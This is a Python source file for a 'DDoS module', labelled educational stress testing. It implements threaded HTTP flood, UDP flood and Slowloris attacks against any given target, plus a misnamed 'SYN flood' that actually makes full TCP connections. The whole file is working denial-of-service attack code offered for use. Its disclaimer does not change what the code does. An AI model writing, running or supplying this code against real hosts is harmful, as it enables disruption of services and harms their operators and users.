#!/usr/bin/env python3
# DDOS MODULE - Stress Testing (Educational Only)
import socket
import threading
import requests
import time
import random
import ssl
from urllib.parse import urlparse

class DDoSAttack:
    def __init__(self):
        self.running = False
        self.threads = []
        
    def http_flood(self, url, duration=60, threads=100):
        """HTTP/HTTPS Flood Attack"""
        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path or "/"
        
        def flood():
            headers = {
                'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
            
            start_time = time.time()
            while self.running and time.time() - start_time < duration:
                try:
                    if parsed.scheme == 'https':
                        requests.get(url, headers=headers, verify=False, timeout=3)
                    else:
                        requests.get(url, headers=headers, timeout=3)
                except:
                    pass
        
        self.running = True
        print(f"🔥 Starting HTTP Flood on {url}")
        print(f"   Duration: {duration}s | Threads: {threads}")
        
        for i in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        time.sleep(duration)
        self.running = False
        print(f"✅ HTTP Flood completed")
    
    def syn_flood(self, target_ip, target_port=80, duration=60, threads=100):
        """SYN Flood Attack (Layer 4)"""
        def flood():
            start_time = time.time()
            while self.running and time.time() - start_time < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((target_ip, target_port))
                    sock.send(b"SYN" * 1024)
                    sock.close()
                except:
                    pass
        
        self.running = True
        print(f"🔥 Starting SYN Flood on {target_ip}:{target_port}")
        print(f"   Duration: {duration}s | Threads: {threads}")
        
        for i in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        time.sleep(duration)
        self.running = False
        print(f"✅ SYN Flood completed")
    
    def udp_flood(self, target_ip, target_port, duration=60, threads=100, packet_size=1024):
        """UDP Flood Attack"""
        def flood():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(packet_size)
            start_time = time.time()
            while self.running and time.time() - start_time < duration:
                try:
                    sock.sendto(data, (target_ip, target_port))
                except:
                    pass
        
        self.running = True
        print(f"🔥 Starting UDP Flood on {target_ip}:{target_port}")
        print(f"   Duration: {duration}s | Threads: {threads}")
        
        for i in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        time.sleep(duration)
        self.running = False
        print(f"✅ UDP Flood completed")
    
    def slowloris(self, target_ip, target_port=80, duration=60, sockets=200):
        """Slowloris Attack - keep connections open"""
        def slowloris_attack():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.random()} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target_ip}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
            sock.send("Accept-language: en-US,en\r\n".encode())
            
            start_time = time.time()
            while self.running and time.time() - start_time < duration:
                try:
                    sock.send("X-Header: {}\r\n".format(random.random()).encode())
                    time.sleep(10)
                except:
                    break
        
        self.running = True
        print(f"🔥 Starting Slowloris on {target_ip}:{target_port}")
        print(f"   Duration: {duration}s | Sockets: {sockets}")
        
        for i in range(sockets):
            t = threading.Thread(target=slowloris_attack)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        time.sleep(duration)
        self.running = False
        print(f"✅ Slowloris completed")
    
    def stop(self):
        """Stop all attacks"""
        self.running = False
        print("🛑 Stopping all attacks...")

if __name__ == "__main__":
    ddos = DDoSAttack()
    print("💥 DDoS Module Ready (Educational Only)")
